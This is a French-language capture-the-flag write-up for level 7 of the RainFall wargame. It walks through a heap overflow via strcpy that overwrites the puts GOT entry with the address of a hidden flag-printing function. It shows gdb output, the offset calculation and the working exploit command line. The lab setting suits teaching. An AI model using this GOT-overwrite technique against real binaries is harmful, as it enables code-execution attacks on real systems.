# Level 7

Apres l'analyse de l'executable dans `gdb` et `ghidra` on peut constate que c'est encore une fois un niveau ayant un potentielle `heap overflow` avec l'utilisation d'une fonction non protegee `strcpy`

Puis l'existence d'une fonction `m` jamais appeler par le `main` qui affiche le temps et le contenu d'un tableau de `char` contenant le `flag` stocke avec `fopen` et `fgets`

Et dernierement un appel a `puts` qui ne sert pas a grand chose dans ce cas precis

Notre objectif est donc de reecrire l'adresse de `puts` dans le `GOT` avec celui de la fonction `m`

Cherchons d'abord l'adresse de `puts`

```bash
(gdb) disas puts
Dump of assembler code for function puts@plt:
   0x08048400 <+0>:	jmp    DWORD PTR ds:0x8049928
   0x08048406 <+6>:	push   0x28
   0x0804840b <+11>:	jmp    0x80483a0
End of assembler dump.
(gdb) x/x 0x8049928
0x8049928 <puts@got.plt>:	0x08048406
```

Et maintenant l'adresse de la fonction `m`

```bash
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
```

Notre executable prenant deux parametres nous allons utiliser le premier et son utilisation dans le premier appel de `strcpy` pour faire un depassement de memoire jusqu'a atteindre le chunk du buffer dans la deuxieme structure pour y ecrire l'adresse de `puts`

Le second `strcpy` écrit indirectement dans `puts@got.plt` grâce au pointeur corrompu

Pour cela il nous faut trouver le `offset`

```text
       [A]              [B Metadata]        [B]
[INT][CHAR *]                      [INT][CHAR *]
```

Le buffer de la premiere structure faisant `8 octets` + `8 octets` pour les metadata de la deuxieme structure + `4 octets` pour un int on peut donc en deduire que l'offset pour atteindre le buffer de la deuxieme structure est de `20 octets`

```bash
level7@RainFall:~$ ./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"')
***************************************************
 - 1767006927
```